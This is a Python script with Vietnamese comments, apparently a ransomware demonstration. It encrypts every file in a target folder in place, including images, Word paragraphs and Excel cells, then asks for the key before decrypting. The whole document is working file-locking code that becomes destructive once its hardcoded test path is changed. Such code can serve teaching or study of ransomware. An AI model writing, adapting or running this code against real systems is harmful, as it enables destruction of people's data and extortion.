import os
from cryptography.fernet import Fernet
from docx import Document
from openpyxl import load_workbook
from PIL import Image


key = Fernet.generate_key()
cipher = Fernet(key)


directory = "E:\\Dev\\Python\\Ransomware Demo\\Test"


# Đọc nội dung của tất cả các file trong thư mục và mã hoá chúng
for filename in os.listdir(directory):
    file_path = os.path.join(directory, filename)
    if filename.lower().endswith('.jpg') or filename.lower().endswith('.jpeg') or filename.lower().endswith('.png'):
        with open(file_path, 'rb') as f:
            data = f.read()
            encrypted_data = cipher.encrypt(data)
        with open(file_path, 'wb') as f:
            f.write(encrypted_data)
    elif filename.lower().endswith('.docx'):
        document = Document(file_path)
        for paragraph in document.paragraphs:
            encrypted_text = cipher.encrypt(paragraph.text.encode())
            paragraph.text = encrypted_text.decode()
        document.save(file_path)
    # Nếu tệp là file Excel mã hóa nội dung trong file Excel
    elif filename.lower().endswith('.xlsx'):
        wb = load_workbook(file_path)
        for sheet in wb.worksheets:
            for row in sheet.iter_rows():
                for cell in row:
                    encrypted_value = cipher.encrypt(str(cell.value).encode())
                    cell.value = encrypted_value.decode()
        wb.save(file_path)
    else:
        with open(os.path.join(directory, filename), 'rb') as f:
            data = f.read()
            encrypted_data = cipher.encrypt(data)
        with open(os.path.join(directory, filename), 'wb') as f:
            f.write(encrypted_data)

# Lưu khóa mã hoá vào file để giải mã sau này
with open('key.key', 'wb') as f:
    f.write(key)

# Đọc khóa mã hoá từ file
with open('key.key', 'rb') as f:
    key = f.read()

# Nhập khóa từ terminal
password = input("Nhập khóa: ")

# Đọc nội dung của tất cả các file trong thư mục và giải mã chúng
# So sánh mật khẩu với khóa đã lưu
if password.encode() == key:
    print("Mật khẩu đúng. Bắt đầu giải mã...")
    # Đọc nội dung của tất cả các file trong thư mục và giải mã chúng
    for filename in os.listdir(directory):
        file_path = os.path.join(directory, filename)
        if filename.lower().endswith('.jpg') or filename.lower().endswith('.jpeg') or filename.lower().endswith('.png'):
            with open(file_path, 'rb') as f:
                data = f.read()
                decrypted_data = cipher.decrypt(data)
            with open(file_path, 'wb') as f:
                f.write(decrypted_data)   
        elif filename.lower().endswith('.docx'):
            document = Document(file_path)
            for paragraph in document.paragraphs:
                decrypted_text = cipher.decrypt(paragraph.text.encode())
                paragraph.text = decrypted_text.decode()
            document.save(file_path)
        elif filename.lower().endswith('.xlsx'):
            wb = load_workbook(os.path.join(directory, filename))
            for sheet in wb.worksheets:
                for row in sheet.iter_rows():
                    for cell in row:
                        # Decrypt cell value if it's not None
                        if cell.value:
                            decrypted_value = cipher.decrypt(cell.value.encode())
                            cell.value = decrypted_value.decode()
            wb.save(os.path.join(directory, filename))
        else:
            with open(os.path.join(directory, filename), 'rb') as f:
                encrypted_data = f.read()
                decrypted_data = cipher.decrypt(encrypted_data)
            with open(os.path.join(directory, filename), 'wb') as f:
                f.write(decrypted_data)
    print("Giải mã thành công!")
    with open('key.key', 'wb') as f:
        f.write(b'')
else:
    print("Mật khẩu sai. Không thể giải mã.")
